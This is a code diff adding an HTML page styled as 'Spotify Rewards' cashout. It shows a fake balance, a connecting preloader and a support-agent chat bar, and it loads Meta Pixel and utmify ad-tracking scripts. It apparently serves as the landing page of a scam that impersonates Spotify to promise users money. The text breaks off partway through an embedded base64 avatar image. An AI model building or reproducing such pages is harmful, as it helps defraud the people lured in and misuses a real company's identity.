@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231DB954'><circle cx='12' cy='12' r='12'/><path fill='%23000' d='M17.9 10.9C14.3 8.8 8.4 8.6 5 9.6c-.5.2-1.1-.1-1.3-.6-.2-.5.1-1.1.6-1.3 3.9-1.2 10.5-1 14.6 1.4.5.3.6.9.3 1.4-.3.5-.9.6-1.3.4zm-.1 2.9c-.3.4-.8.5-1.2.3-3-1.8-7.5-2.4-11-1.3-.4.1-.9-.1-1.1-.5-.1-.4.1-.9.5-1.1 4-1.2 9-.6 12.4 1.5.4.2.5.7.4 1.1zm-1.4 2.8c-.2.3-.6.4-.9.2-2.6-1.6-5.9-2-9.7-1.1-.4.1-.7-.2-.8-.5-.1-.4.2-.7.5-.8 4.2-1 7.8-.5 10.7 1.3.3.2.4.6.2.9z'/></svg>">
+    <!-- Meta Pixel Code (Aguardando Pixel Novo do Dudu) -->
+  <script>
+    window.META_PIXEL_ID = "1665969885178094"; // O Dudu vai preencher com o Pixel NOVO
+    if (window.META_PIXEL_ID && window.META_PIXEL_ID.trim() !== '') {
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', window.META_PIXEL_ID);
+      fbq('track', 'PageView');
+    }
+  </script>
+
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids data-utmify-ignore-iframe async defer></script>
+  <script>
+    window.pixelId = "6aec82d6b787ded5b88ce7a1";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Spotify Rewards - Withdrawal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: radial-gradient(ellipse at 60% 0%, #0d3320 0%, #071a0f 35%, #050505 70%);
+      color: #fff;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* Decorative ambient glow blobs */
+    body::before {
+      content: '';
+      position: fixed;
+      top: -120px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 500px;
+      height: 300px;
+      background: radial-gradient(ellipse, rgba(29, 185, 84, 0.18) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      bottom: -80px;
+      right: 10%;
+      width: 300px;
+      height: 200px;
+      background: radial-gradient(ellipse, rgba(29, 185, 84, 0.08) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .phone-container {
+      width: 100%;
+      max-width: 480px;
+      height: 100%;
+      background: #111111;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 0 60px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(29, 185, 84, 0.08);
+      z-index: 1;
+    }
+
+    /* Spotify Style Header */
+    .app-header {
+      background: #000;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      border-bottom: 1px solid #282828;
+      flex-shrink: 0;
+    }
+
+    .app-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 18px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: -0.5px;
+    }
+
+    .app-logo svg {
+      width: 24px;
+      height: 24px;
+      fill: #1DB954;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* Balance Pill (Green) */
+    .balance-pill {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: #1DB954;
+      border-radius: 999px;
+      padding: 8px 16px;
+      font-size: 17px;
+      font-weight: 800;
+      color: #000;
+      letter-spacing: -0.3px;
+    }
+
+    /* Main chat container to look like it is placed inside the app borders */
+    .chat-wrapper {
+      flex: 1;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      background-color: transparent;
+      overflow: hidden;
+    }
+
+    .chat-card {
+      flex: 1;
+      background-color: #ffffff;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='80' viewBox='0 0 24 24'%3E%3Cpath fill='%231DB954' opacity='0.02' d='M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z'/%3E%3C/svg%3E");
+      background-repeat: repeat;
+      background-size: 60px 60px;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(29, 185, 84, 0.1);
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Agent Bar Style */
+    .chat-agent-bar {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      background: linear-gradient(135deg, #fafafa 0%, #f0f9f4 100%);
+      border-bottom: 1px solid rgba(29, 185, 84, 0.15);
+      flex-shrink: 0;
+    }
+
+    .chat-agent-avatar {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2.5px solid #1DB954;
+      box-shadow: 0 0 0 4px rgba(29, 185, 84, 0.12);
+    }
+
+    .chat-agent-info {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+      text-align: left;
+    }
+
+    .chat-agent-name {
+      font-size: 14px;
+      font-weight: 700;
+      color: #121212;
+      line-height: 1.2;
+    }
+
+    .chat-agent-status {
+      font-size: 11px;
+      color: #1DB954;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    /* Pulsing green dot */
+    .chat-agent-status::before {
+      content: '';
+      display: inline-block;
+      width: 7px;
+      height: 7px;
+      background-color: #1DB954;
+      border-radius: 50%;
+      animation: statusPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes statusPulse {
+
+      0%,
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+
+      50% {
+        opacity: 0.5;
+        transform: scale(0.85);
+      }
+    }
+
+    iframe {
+      width: 100%;
+      flex: 1;
+      border: none;
+      background: #fff;
+    }
+
+    /* ─── RESPONSIVE / MOBILE ─────────────────────── */
+    @media (max-width: 480px) {
+      body {
+        height: 100dvh;
+        align-items: stretch;
+      }
+
+      .phone-container {
+        max-width: 100%;
+        border-radius: 0;
+        box-shadow: none;
+        /* Spotify gradient fills the whole screen on mobile */
+        background: linear-gradient(180deg, #071a0f 0%, #0d0d0d 40%, #080808 100%);
+      }
+
+      .app-header {
+        height: 54px;
+        padding: 0 12px;
+        background: rgba(0, 0, 0, 0.85);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+      }
+
+      .app-logo {
+        font-size: 16px;
+      }
+
+      .app-logo svg {
+        width: 20px;
+        height: 20px;
+      }
+
+      .balance-pill {
+        padding: 7px 14px;
+        font-size: 15px;
+        font-weight: 800;
+      }
+
+      .chat-wrapper {
+        padding: 10px;
+        /* Matching gradient for the wrapper area */
+        background: linear-gradient(180deg, #071a0f 0%, #0d0d0d 100%);
+        position: relative;
+      }
+
+      /* Green ambient glow on mobile above the chat card */
+      .chat-wrapper::before {
+        content: '';
+        position: absolute;
+        top: -30px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 80%;
+        height: 60px;
+        background: radial-gradient(ellipse, rgba(29, 185, 84, 0.2) 0%, transparent 70%);
+        pointer-events: none;
+      }
+
+      .chat-card {
+        border-radius: 14px;
+        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(29, 185, 84, 0.12);
+      }
+    }
+
+
+    /* iPhone safe-area (notch/home bar) */
+    @supports (padding: env(safe-area-inset-bottom)) {
+      .chat-wrapper {
+        padding-bottom: calc(10px + env(safe-area-inset-bottom));
+      }
+    }
+  
+    /* ─── SPOTIFY PRELOADER OVERLAY (AUTHENTIC / CLEAN) ─── */
+    .spotify-preloader {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      z-index: 1000;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 24px;
+      box-sizing: border-box;
+      transition: opacity 0.4s ease, visibility 0.4s ease;
+    }
+
+    .spotify-preloader.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+
+    .preloader-content {
+      width: 100%;
+      max-width: 300px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .preloader-brand {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 32px;
+    }
+
+    .preloader-brand-icon {
+      width: 36px;
+      height: 36px;
+      fill: #1DB954;
+    }
+
+    .preloader-brand-title {
+      font-size: 22px;
+      font-weight: 800;
+      color: #000000;
+      letter-spacing: -0.5px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .preloader-brand-sub {
+      font-size: 12px;
+      font-weight: 600;
+      color: #6a6a6a;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      border-left: 1.5px solid #dcdcdc;
+      padding-left: 8px;
+    }
+
+    .preloader-spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid #eef2f0;
+      border-top: 3px solid #1DB954;
+      border-radius: 50%;
+      animation: officialSpin 0.75s linear infinite;
+      margin-bottom: 24px;
+    }
+
+    @keyframes officialSpin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .preloader-status {
+      font-size: 14px;
+      color: #333333;
+      font-weight: 600;
+      margin-bottom: 14px;
+      letter-spacing: -0.2px;
+      min-height: 20px;
+    }
+
+    .preloader-bar-bg {
+      width: 100%;
+      height: 4px;
+      background: #eeeeee;
+      border-radius: 999px;
+      overflow: hidden;
+    }
+
+    .preloader-bar-fill {
+      width: 0%;
+      height: 100%;
+      background: #1DB954;
+      border-radius: 999px;
+      transition: width 0.35s ease;
+    }
+
+</style>
+</head>
+
+<body>
+
+  <div class="phone-container">
+
+    <!-- SPOTIFY PRE-LOADER OVERLAY -->
+    <div id="spotifyPreloader" class="spotify-preloader">
+      <div class="preloader-content">
+        <div class="preloader-brand">
+          <svg viewBox="0 0 24 24" class="preloader-brand-icon">
+            <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" />
+          </svg>
+          <span class="preloader-brand-title">Spotify <span class="preloader-brand-sub">Rewards</span></span>
+        </div>
+
+        <div class="preloader-spinner"></div>
+
+        <div class="preloader-status" id="preloaderStatus">Connecting to Spotify Rewards...</div>
+
+        <div class="preloader-bar-bg">
+          <div class="preloader-bar-fill" id="preloaderBar"></div>
+        </div>
+      </div>
+    </div>
+    <header class="app-header">
+      <div class="app-logo">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path
+            d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" />
+        </svg>
+        Spotify<span
+          style="font-weight: 400; font-size: 11px; opacity: 0.7; border-left: 1px solid rgba(255,255,255,0.25); padding-left: 8px; margin-left: 8px; text-transform: uppercase; letter-spacing: 0.8px;">Cashout</span>
+      </div>
+      <div class="header-right">
+        <div class="balance-pill">
+          $<span id="headerBalance">0.00</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- Chat wrapper with borders as requested -->
+    <div class="chat-wrapper">
+      <div class="chat-card">
+        <!-- Support Agent Header Bar (Kaytlynn W. Spotify Support) -->
+        <div class="chat-agent-bar">
+          <img class="chat-agent-avatar" src="data:image/jpeg;base64,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